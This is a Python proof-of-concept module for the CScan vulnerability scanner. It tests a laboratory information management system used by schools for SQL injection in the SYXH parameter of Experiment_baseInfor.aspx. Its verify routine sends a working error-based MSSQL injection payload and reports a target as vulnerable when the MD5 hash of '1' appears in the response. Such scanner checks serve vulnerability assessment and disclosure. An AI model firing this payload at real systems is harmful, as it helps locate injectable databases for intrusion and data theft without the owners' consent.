# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'SunData_0001'  # 平台漏洞编号，留空
    name = '三唐实验室综合信息管理系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-07'  # 漏洞公布时间
    desc = '''
        三唐实验室综合信息管理系统是由湖南三唐信息科技有限公司打造的一款集实验室人员管理、教育部数据报表、实验室资源共享等功能的管理系统。
        湖南三唐信息科技有限公司某学校在用的通用型实验管理系统SQL注入漏洞。
        /AllInfor/Experiment_baseInfor.aspx?SYXH=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0105992'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '三唐实验室综合信息管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aa25dfda-1007-441c-8574-15cdf4c7c7af'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.1 http://www.wooyun.org/bugs/wooyun-2010-0105992
            payload = "/AllInfor/Experiment_baseInfor.aspx?SYXH=1%27%20and%201=convert(int,(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and%20%271%27=%271"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target)
            if 'c4ca4238a0b923820dcc509a6f75849' in body:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
